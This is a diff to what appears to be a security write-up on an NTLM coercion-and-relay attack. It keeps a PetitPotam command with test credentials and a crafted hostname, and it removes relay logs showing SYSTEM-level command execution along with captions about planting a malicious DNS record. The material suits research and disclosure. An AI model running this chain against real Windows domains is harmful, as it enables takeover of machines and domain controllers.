@@ -73,32 +73,9 @@ python PetitPotam.py -d test.com -u test1 -p Test..111 win10pc1UWhRCAAAAAAAAAAAA
 ## Terminal Output Examples
 
 **Terminal 1 - ntlmrelayx.py**:
-```
-[*] SMBD-Thread-3: Received connection from 192.168.214.135
-[*] Authenticating against smb://192.168.214.135 as LUCKYTOM/WIN10$ SUCCEED
-[*] Service RemoteRegistry is in stopped state
-[*] Service RemoteRegistry is disabled, enabling it
-[*] Starting service RemoteRegistry
-[*] Executed specified command on host: 192.168.214.135
-nt authority\system  ← SYSTEM PRIVILEGES OBTAINED
-```
+
 
 **Terminal 2 - PetitPotam.py**:
-```
-[*] Attempting to coerce authentication from 192.168.214.135
-[*] Using pipe: lsarpc
-[*] Successfully triggered authentication!
-```
-
-## Screenshots
-![DNS Record Addition](image.png)
-*Successfully added malicious DNS record to Domain Controller*
-
-![NTLM Relay Success](image-1.png)
-*ntlmrelayx capturing and relaying authentication*
-
-![SYSTEM Shell](image-2.png)
-*Command execution with NT AUTHORITY\SYSTEM privileges*
 
 # Root Cause Analysis
 
